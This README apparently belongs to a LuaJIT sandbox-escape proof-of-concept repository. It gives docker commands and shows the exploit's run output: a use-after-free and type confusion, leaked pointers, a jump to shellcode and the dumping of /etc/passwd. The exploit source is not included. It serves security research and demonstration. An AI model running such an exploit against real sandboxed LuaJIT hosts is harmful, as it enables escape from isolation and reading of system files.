# LuaJIT Sandbox Escape

Full details can be found [here](https://0xbigshaq.github.io/2022/12/30/luajit-sandbox-escape/)

To, build the env, run:
```
docker build -t luajit-sbx-escape .
```

To run:
```
$ docker run --rm -it luajit-sbx-escape
root@16ca2c4ca1f2:~# ls
LuaJIT/  exp-gen.py  hacktheplanet.lua  hax.lua

root@16ca2c4ca1f2:~# luajit hacktheplanet.lua 
[*] UAF + type confusion done :D
[*] Creating a hotloop
[*] Done, trace is ready!
[*] allocf @    0x55ad8b4ea7e0
[*] Finding global_State::allocf ptr... @       0x4099cf18
[*] GCRef array @       0x409a0e58
[*] GCtrace->mcode @    0x55adb55df9bd
[*] JITed ptr corrupted! jumping to shellcode :^)

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```

